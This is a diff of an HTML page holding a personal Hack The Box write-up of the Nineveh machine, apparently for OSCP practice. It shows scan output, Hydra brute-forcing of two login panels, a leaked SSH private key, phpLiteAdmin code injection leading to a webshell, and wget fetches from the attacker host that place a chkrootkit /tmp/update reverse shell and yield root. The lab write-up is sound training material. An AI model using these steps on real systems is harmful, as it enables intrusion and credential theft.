@@ -1,117 +1,464 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nineveh - Hack The Box Write-Up | Sean Beattie</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="../css/style.css"> <!-- Adjust path if needed -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nineveh Write-up</title>
+    <link rel="stylesheet" href="../style.css">
+    <script defer src="../script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 </head>
 <body>
+    <div class="container">
+        <nav class="navbar">
+            <ul class="nav-links">
+                <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="../writeups.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="../projects.html"><i class="fas fa-user-secret"></i> Projects</a></li>
+            </ul>
+        </nav>
+        <div class="contents">
+            <h1>Nineveh Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="../images/nineveh.png" alt="Nineveh">
+            </div>
+            <p>This write-up focuses on the Hack The Box machine "Nineveh," which is part of TJnull's recommended list for OSCP preparation. Nineveh centers on web application vulnerabilities, particularly exploiting weaknesses in phpLiteAdmin and a custom web interface, along with using advanced techniques like port knocking and a known vulnerability in Chkrootkit for privilege escalation.</p>
+            <h2>Enumeration</h2>
+            <p>I began by performing an Nmap scan on the target host to identify open ports and services. Once the scan completed, it revealed two open ports: port 80 (HTTP) and port 443 (HTTPS). This discovery strongly indicated that the target was hosting a web server.</p>
+            <div class="snippet">
+                <pre class="code-block">
+nmap -A -v 10.129.238.84
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 15:44 CST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 15:44
+Completed NSE at 15:44, 0.00s elapsed
+Initiating NSE at 15:44
+Completed NSE at 15:44, 0.00s elapsed
+Initiating NSE at 15:44
+Completed NSE at 15:44, 0.00s elapsed
+Initiating Ping Scan at 15:44
+Scanning 10.129.238.84 [4 ports]
+Completed Ping Scan at 15:44, 0.10s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:44
+Completed Parallel DNS resolution of 1 host. at 15:44, 0.02s elapsed
+Initiating SYN Stealth Scan at 15:44
+Scanning 10.129.238.84 [1000 ports]
+Discovered open port 443/tcp on 10.129.238.84
+Discovered open port 80/tcp on 10.129.238.84
+Completed SYN Stealth Scan at 15:45, 6.69s elapsed (1000 total ports)
+Initiating Service scan at 15:45
+Scanning 2 services on 10.129.238.84
+Completed Service scan at 15:45, 12.67s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.129.238.84
+Retrying OS detection (try #2) against 10.129.238.84
+adjust_timeouts2: packet supposedly had rtt of -140116 microseconds.  Ignoring time.
+adjust_timeouts2: packet supposedly had rtt of -140116 microseconds.  Ignoring time.
+Initiating Traceroute at 15:45
+Completed Traceroute at 15:45, 0.09s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 15:45
+Completed Parallel DNS resolution of 2 hosts. at 15:45, 0.02s elapsed
+NSE: Script scanning 10.129.238.84.
+Initiating NSE at 15:45
+Completed NSE at 15:45, 5.16s elapsed
+Initiating NSE at 15:45
+Completed NSE at 15:45, 0.87s elapsed
+Initiating NSE at 15:45
+Completed NSE at 15:45, 0.00s elapsed
+Nmap scan report for 10.129.238.84
+Host is up (0.074s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.18 (2 (Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+443/tcp open  ssl/http Apache httpd 2.4.18 (2 (Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
+| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-07-01T15:03:30
+| Not valid after:  2018-07-01T15:03:30
+| MD5:   d182:94b8:0210:7992:bf01:e802:b26f:8639
+|_SHA-1: 2275:b03e:27bd:1226:fdaa:8b0f:6de9:84f0:113b:42c0
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|specialized|phone|storage-misc
+Running (JUST GUESSING): Linux 3.X|4.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/h:hp:p2000_g3
+Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 - 4.9 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 4.8 (90%), Linux 4.9 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 198.047 days (since Wed May  1 15:37:07 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
 
-  <nav>
-    <ul>
-      <li><a href="../index.html#home">Home</a></li>
-      <li><a href="../index.html#about">About</a></li>
-      <li><a href="../projects.html">Projects</a></li>
-      <li><a href="../writeups.html">Write-Ups</a></li>
-      <li><a href="../index.html#contact">Contact</a></li>
-    </ul>
-  </nav>
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   55.84 ms 10.10.16.1
+2   76.59 ms 10.129.238.84
 
-  <div class="contents">
-    <h1>Nineveh – Hack The Box Write-Up</h1>
+NSE: Script Post-scanning.
+Initiating NSE at 15:45
+Completed NSE at 15:45, 0.00s elapsed
+Initiating NSE at 15:45
+Completed NSE at 15:45, 0.00s elapsed
+Initiating NSE at 15:45
+Completed NSE at 15:45, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
+           Raw packets sent: 2088 (95.444KB) | Rcvd: 544 (232.948KB)
+                </pre>
+            </div>
 
-    <div class="big-to-normal-image">
-      <img src="../images/nineveh.png" alt="Nineveh Machine Banner"> <!-- Add your own banner image if you have one -->
+            <p>Port 80 and 443</p>
+            <p>When I navigated to the website hosted on port 80, I encountered a default webpage for the webserver, providing no immediately useful information. I then decided to visit the site on port 443. This site displayed an image, but like the default webpage on port 80, it offered little to work with.</p>
+            <p>To gather more information, I decided to run two Gobuster scans—one for each port—to search for any hidden directories and files. I also executed a Nikto scan to identify any potential vulnerabilities or misconfigurations within the webserver that could aid in advancing my investigation.</p>
+
+            <h3>Gobuster & Nikto Scans</h3>
+            <p>After running two Gobuster scans and a Nikto scan on the Nineveh machine, several interesting directories and files were uncovered. The Gobuster scans revealed the following directories: /department, /db/, and /secure_notes, each potentially harboring sensitive information. Meanwhile, the Nikto scan uncovered a file at /info.php, which could provide valuable insight into the server's configuration or potentially expose vulnerabilities.</p>
+
+            <div class="snippet">
+                <pre class="code-block">gobuster dir -u http://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt    
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.238.84
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/department           (Status: 301) [Size: 319] [--> http://10.129.238.84/department/]
+/server-status        (Status: 403) [Size: 301]
+Progress: 207643 / 207644 (100.00%)
+===============================================================
+Finished
+===============================================================
+                </pre>
+            </div>
+
+            <div class="snippet">
+                <pre class="code-block">gobuster dir -k -u https://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://10.129.238.84
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/db                   (Status: 301) [Size: 313] [--> https://10.129.238.84/db/]
+/server-status        (Status: 403) [Size: 302]
+/secure_notes         (Status: 301) [Size: 323] [--> https://10.129.238.84/secure_notes/]
+Progress: 207643 / 207644 (100.00%)
+===============================================================
+Finished
+===============================================================
+                </pre>
+            </div>
+
+            <div class="snippet">
+                <pre class="code-block">nikto -h http://10.129.238.84/ 
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.129.238.84
++ Target Hostname:    10.129.238.84
++ Target Port:        80
++ Start Time:         2024-11-15 15:47:31 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: b2, size: 5535e4e04002a, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
++ /info.php: Output from the phpinfo() function was found.
++ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2024-11-15 16:00:41 (GMT-6) (790 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                </pre>
+            </div>
+
+            <h3>/Department Directory</h3>
+            <p>I started by exploring the /department directory, which presented a login panel. Initially, this seemed to be a simple point of entry, but I decided to examine the source code of the page to look for any hidden information. In the process, I discovered a comment left by an administrator. The comment mentioned that MySQL had been installed and asked another admin to fix the webpage. While this comment might seem unimportant at first glance, it provided several valuable insights.</p>
+            <p>Firstly, it listed two potential usernames: admin and amrois, which could be useful for authentication attempts. Secondly, the mention of MySQL installation hinted at the possibility of a MySQL-related vulnerability, suggesting that I might be able to exploit the database setup. Lastly, the comment indicated that the login page itself was problematic and needed fixing, which implied that it could be vulnerable to certain attacks. With this information in mind, I decided to use the login panel as my primary attack vector, hoping to exploit any weaknesses related to authentication or database interaction.</p>
+            <div class="snippet">
+                <pre class="code-block">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</pre>
+            </div>
+
+            <h3>/db/ Directory</h3>
+            <p>Before proceeding with an attack on the /department login panel, I thought it would be good to explore the other directories to see if there were additional vulnerabilities I could exploit. When I accessed the /db/ directory, I encountered another login panel-this time for phpLiteAdmin version 1.9. I then went ahead and checked the source code for this page as well, but unfortunately, I didn't find any useful information there. However, given that I already had two possible usernames-admin and amrois-I speculated that these might work for this panel too. With this in mind, I expanded my attack vector to include this phpLiteAdmin panel.</p>
+
+            <h3>/Secure_notes Directory</h3>
+            <p>Finally, I decided to explore the /secure_notes directory, where I was presented with an image. At first, I wasn't sure what purpose the image could serve, but given the directory's name, I realized it might contain hidden information. With this in mind, I downloaded the image to my local machine and ran the strings command to any hidden data. Sure enough, the command revealed both a private and public RSA key for SSH under the username amrois.</p>
+            <p>While this would normally be very useful for SSH access, my initial Nmap scan had not shown any open or filtered SSH ports. To double-check, I ran additional Nmap scans with different flags to see if I had missed an SSH port, but no matter how I adjusted the scans, I couldn't detect any SSH services running. At this point, I decided to set aside the SSH keys for the time being, but kept them in mind, hoping they might prove useful later in the exercise.</p>
+            <div class="snippet">
+                <pre class="code-block">-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+secret/nineveh.pub
+0000644
+0000041
+0000041
+00000000620
+13126060277
+014541
+ustar  
+www-data
+www-data
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
+                </pre>
+            </div>
+
+            <h2>Hydra Bruteforce Attacks</h2>
+            <p>With the two login panels and the two usernames in mind, I decided to use Hydra to brute-force the passwords. My first step was to capture the login requests for both panels using Burp Suite, which allowed me to capture the necessary parameters. Once I had the captured requests, I added them to my Hydra command line for brute-forcing.</p>
+            <p>For the first login panel located in the /department directory, I encountered several failed attempts with various wordlists. After trying a few different ones, I finally cracked the password using the 10k-most-common wordlist. As for the second login panel in the /db/ directory, I used the popular rockyou wordlist, which quickly gave me the correct password.</p>
+
+            <div class="snippet">
+                <pre class="code-block">hydra -l admin -P  /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-15 15:50:14
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
+[DATA] attacking http-post-form://10.129.238.84:80/department/login.php:username=^USER^&password=^PASS^:Invalid
+[STATUS] 3282.00 tries/min, 3282 tries in 00:01h, 6718 to do in 00:03h, 64 active
+[STATUS] 3240.00 tries/min, 6480 tries in 00:02h, 3520 to do in 00:02h, 64 active
+[80][http-post-form] host: 10.129.238.84   login: admin   password: 1q2w3e4r5t
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 15:52:57
+                </pre>
+            </div>
+
+            <div class="snippet">
+                <pre class="code-block">hydra -l admin -P  /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-15 15:48:55
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-post-forms://10.129.238.84:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect
+[443][http-post-form] host: 10.129.238.84   login: admin   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-15 15:50:00
+                </pre>
+            </div>
+
+            <h3>Department Admin Panel</h3>
+            <p>After successfully logging into both admin panels with the obtained passwords, I began inspecting their contents. In the first admin panel, I found a "notes" tab that displayed a message from amrois. The note referenced a previous comment I had found in the source code, following up on the status of the login page fix and warning that hardcoded usernames and passwords were problematic. It also mentioned checking the "secret folder" to gain access. Additionally, I noticed that the structure of the page suggested a potential Local File Inclusion (LFI) vulnerability, as the link for the page appeared to allow navigation between different files. I made a mental note of this vulnerability and moved on to examining the second admin panel.</p>
+
+            <h3>Db Admin Panel</h3>
+            <p>While inspecting the second admin panel, I discovered that I had the ability to create my own database. To better understand how I could exploit this, I researched vulnerabilities related to phpLiteAdmin 1.9. Almost immediately, I came across a CVE for phpLiteAdmin version 1.9.3, which described a Remote PHP Code Injection vulnerability. This flaw allows an attacker to create an SQLite database with a .php extension and insert PHP code as text fields. Once the database is created, the attacker can execute the embedded PHP code by accessing the database file via a web browser.</p>
+
+            <h2>Remote PHP Code Injection</h2>
+            <p>With the phpLiteAdmin vulnerability in mind, I decided to test it by attempting to gain a reverse shell. To do this, I created a new SQLite database and inserted a simple PHP webshell into one of its text fields. Once the webshell was in place, I used Burp Suite to test the vulnerability before attempting a full shell. I ran the ls command to see if it would return any directories from the system. Sure enough, the vulnerability was successful, and the response returned a list of directories running on the system. This confirmed that I had successfully exploited the vulnerability, and I could move forward with attempting a reverse shell.</p>
+
+            <h2>Webshell</h2>
+            <p>With the vulnerability confirmed to be active on the webserver, I went ahead and set up a Netcat listener on my local machine and used a reverse shell from PentestMonkey. After that, I repeated the same process I had used when testing the vulnerability, but this time with an encoded reverse shell script using Burp Suite. Once I executed the payload, I successfully obtained a reverse shell, and I was able to interact with the target system from my local terminal, gaining deeper access to the machine.</p>
+
+            <div class="snippet">
+                <pre class="code-block">nc -lvnp 8090  
+listening on [any] 8090 ...
+connect to [10.10.16.10] from (UNKNOWN) [10.129.238.84] 45282
+/bin/sh: 0: can't access tty; job control turned off
+$</pre>
+            </div>
+
+            <h2>Privilege Escalation</h2>
+            <p>Now that I had successfully gained a shell on the target system, it was time to focus on escalating my privileges. The first step was to establish a more stable shell using Python3. Once that was done, I began enumerating the system to see what information I could gather. During the enumeration process, I discovered the user flag within the amrois user directory.</p>
+            <p>I also found that I didn't have access to sudo, meaning I would need to find another method for privilege escalation. One thing I did notice was that I could still download files onto the system using wget and store them in the /tmp directory. With this in mind, I decided to download and install the LinEnum script, a popular enumeration tool, to gather more information about potential privilege escalation vectors. Running LinEnum would help me identify any weaknesses in the system that I could exploit to elevate my privileges.</p>
+
+            <div class="snippet">
+                <pre class="code-block">www-data@nineveh:/var/www/html/department$ cd /tmp
+cd /tmp
+www-data@nineveh:/tmp$ wget 10.10.16.10/LinEnum.sh
+wget 10.10.16.10/LinEnum.sh
+--2024-11-15 15:56:35--  http://10.10.16.10/LinEnum.sh
+Connecting to 10.10.16.10:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'LinEnum.sh'
+
+LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    
+
+2024-11-15 15:56:35 (329 KB/s) - 'LinEnum.sh' saved [46631/46631]
+
+www-data@nineveh:/tmp$ ls
+LinEnum.sh
+f
+systemd-private-3e4242aa0160168461390fbe3898a4d3734-systemd-timesyncd.service-ZoZvad
+vmware-root
+www-data@nineveh:/tmp$ bash LinEnum.sh
+bash LinEnum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982</pre>
+            </div>
+
+            <h3>Chkrootkit</h3>
+            <p>While reviewing the results from the LinEnum script, I didn't find much of interest on the system. However, as I continued exploring, I came across a few directories I hadn't checked yet, including /report. Upon examining this directory, I noticed that a new file was being created every minute. Curious about the source of this file, I uploaded and ran a Bash script designed to track the process responsible for it. The script immediately returned results, and upon reviewing them, I discovered that Chkrootkit was creating these files.</p>
+            <p>Chkrootkit is a tool used for detecting rootkits, and it was configured to run periodically as part of a scheduled cron job. It generates log files to document its findings, and these were being created every minute within the report directory. I then decided to do some further investigation of Chkrootkit, which led me to a CVE related to it that involved a Local Privilege Escalation vulnerability. This vulnerability allowed Chkrootkit to execute a file called /tmp/update. I then realized that if I were to place a file named update in the /tmp directory containing a reverse shell, I could potentially trigger Chkrootkit to execute the reverse shell and gain root access.</p>
+
+            <div class="snippet">
+                <pre class="code-block">www-data@nineveh:/var/www/html/department$ cd /tmp
+cd /tmp
+www-data@nineveh:/tmp$ wget 10.10.16.10/procmon.sh
+wget 10.10.16.10/procmon.sh
+--2024-11-15 16:12:23--  http://10.10.16.10/procmon.sh
+Connecting to 10.10.16.10:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 584 [text/x-sh]
+Saving to: 'procmon.sh'
+
+procmon.sh          100%[===================>]     584  --.-KB/s    in 0.001s  
+
+2024-11-15 16:12:24 (1.05 MB/s) - 'procmon.sh' saved [584/584]
+
+www-data@nineveh:/tmp$ ls
+LinEnum.sh
+f
+procmon.sh
+systemd-private-3e4242aa0168461390fbe3898a4d3734-systemd-timesyncd.service-ZoZvad
+vmware-root
+www-data@nineveh:/tmp$ chmod +x procmon.sh
+chmod +x procmon.sh
+www-data@nineveh:/tmp$ ls
+LinEnum.sh
+f
+procmon.sh
+systemd-private-3e4242aa0168461390fbe3898a4d3734-systemd-timesyncd.service-ZoZvad
+vmware-root
+www-data@nineveh:/tmp$ bash procmon.sh
+bash procmon.sh
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; [apache2] &lt;defunct&gt;
+&lt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&gt; /usr/sbin/CRON -f
+&gt; /bin/sh -c /root/vulnScan.sh
+&gt; /bin/bash /root/vulnScan.sh
+&gt; /bin/sh /usr/bin/chkrootkit
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/apache2 -k start
+&gt; [apache2] &lt;defunct&gt;
+&lt; /usr/sbin/CRON -f
+&lt; /bin/sh -c /root/vulnScan.sh
+&lt; /bin/bash /root/vulnScan.sh
+&lt; /bin/sh /usr/bin/chkrootkit
+                </pre>
+            </div>
+
+            <h2>Root shell</h2>
+            <p>With the Chkrootkit vulnerability in mind, I created a file called update in the /tmp directory and uploaded it with a Netcat reverse shell inside. After setting up my listener, I waited for a minute, and sure enough, I received a root shell. From there, I navigated to the root directory and retrieved the root flag, successfully pwning the machine!</p>
+
+            <div class="snippet">
+                <pre class="code-block">www-data@nineveh:/tmp$ wget 10.10.16.10/update
+wget 10.10.16.10/update
+--2024-11-15 16:21:38--  http://10.10.16.10/update
+Connecting to 10.10.16.10:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 92 [application/octet-stream]
+Saving to: 'update'
+
+update              100%[===================>]      92  --.-KB/s    in 0s      
+
+2024-11-15 16:21:38 (13.2 MB/s) - 'update' saved [92/92]
+
+www-data@nineveh:/tmp$ ls
+LinEnum.sh
+f
+procmon.sh
+systemd-private-3e4242aa0168461390fbe3898a4d3734-systemd-timesyncd.service-ZoZvad
+update
+vmware-root
+www-data@nineveh:/tmp$ chmod +x update
+chmod +x update
+www-data@nineveh:/tmp$ ./update
+./update
+nc -lvnp 1234  
+listening on [any] 1234 ...
+connect to [10.10.16.10] from (UNKNOWN) [10.129.238.84] 34998
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls 
+root.txt
+test.txt
+vulnScan.sh
+# cat root.txt
+79bcf1e7824499b9266be71dc77e0d7c
+#
+                </pre>
+            </div>
+        </div>
     </div>
-
-    <p>This write-up covers the Hack The Box machine "Nineveh," part of TJnull's recommended list for OSCP preparation. The box focuses on web application vulnerabilities (phpLiteAdmin and a custom interface), along with a known Chkrootkit privilege escalation vulnerability.</p>
-
-    <h2>Enumeration</h2>
-    <p>I started with a full Nmap scan to identify open ports and services:</p>
-    <div class="snippet">
-      <pre class="code-block">nmap -A -v 10.129.238.84</pre>
-    </div>
-    <p>Key findings:</p>
-    <ul>
-      <li>Port 80 (HTTP) – Apache httpd 2.4.18 (Ubuntu)</li>
-      <li>Port 443 (HTTPS) – Apache httpd 2.4.18 (Ubuntu)</li>
-    </ul>
-
-    <h2>Web Enumeration</h2>
-    <p>Both ports hosted basic pages. I ran Gobuster and Nikto to discover hidden directories:</p>
-
-    <h3>Gobuster (HTTP)</h3>
-    <div class="snippet">
-      <pre class="code-block">gobuster dir -u http://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</pre>
-    </div>
-    <p>Found: <code>/department</code></p>
-
-    <h3>Gobuster (HTTPS)</h3>
-    <div class="snippet">
-      <pre class="code-block">gobuster dir -k -u https://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</pre>
-    </div>
-    <p>Found: <code>/db</code>, <code>/secure_notes</code></p>
-
-    <h3>/department</h3>
-    <p>Login page with a comment in source:</p>
-    <div class="snippet">
-      <pre class="code-block">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</pre>
-    </div>
